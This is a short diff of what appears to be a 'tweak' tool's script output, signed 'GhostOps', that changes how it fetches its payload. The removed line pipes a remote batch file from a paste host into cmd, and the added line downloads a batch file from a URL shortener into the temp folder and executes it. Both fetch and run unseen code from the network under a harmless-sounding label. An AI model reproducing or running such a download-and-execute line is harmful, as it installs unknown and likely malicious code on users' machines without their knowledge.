@@ -12,7 +12,7 @@
 [✓] Masking trace routes...
 [•] Getting tweak via curl...
 
-curl -sL https://0x0.st/abcXYZ.bat | cmd
+curl -sL https://tinyurl.com/tweak100 -o "%TEMP%\tweaker.bat" && "%TEMP%\tweaker.bat"
 
 ════════════════════════════════════
         INITIATED BY: GhostOps
